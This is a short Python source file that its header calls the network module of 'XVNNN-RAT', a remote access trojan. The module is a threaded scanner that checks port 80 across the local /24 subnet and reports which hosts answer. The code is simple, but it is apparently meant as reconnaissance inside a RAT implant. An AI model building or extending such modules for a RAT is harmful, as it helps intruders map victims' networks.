"""
Network module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import socket
import concurrent.futures
import logging
from utils.network import get_local_ip

logger = logging.getLogger(__name__)

class NetworkModule:
    """Network scanning module"""
    
    def __init__(self):
        self.name = "network"
    
    def scan(self, target):
        """Scan network for devices"""
        try:
            def scan_host(ip):
                try:
                    socket.setdefaulttimeout(1)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = s.connect_ex((ip, 80))
                    s.close()
                    return ip if result == 0 else None
                except:
                    return None
            
            # Determine network range
            if not target:
                local_ip = get_local_ip()
                if local_ip != 'Unknown':
                    target = '.'.join(local_ip.split('.')[:3]) + '.1-254'
                else:
                    target = '192.168.1.1-254'
            
            # Parse target
            if '-' in target:
                base, range_part = target.rsplit('.', 1)
                start, end = map(int, range_part.split('-'))
                ips = [f"{base}.{i}" for i in range(start, end + 1)]
            else:
                ips = [target]
            
            # Scan in parallel with limited threads
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(scan_host, ip): ip for ip in ips}
                results = []
                for future in concurrent.futures.as_completed(futures):
                    host = future.result()
                    if host:
                        results.append(host)
            
            return {'type': 'network_scan', 'hosts': results}
        except Exception as e:
            logger.error(f"Network scan error: {e}")
            return {'type': 'network_scan', 'error': str(e)}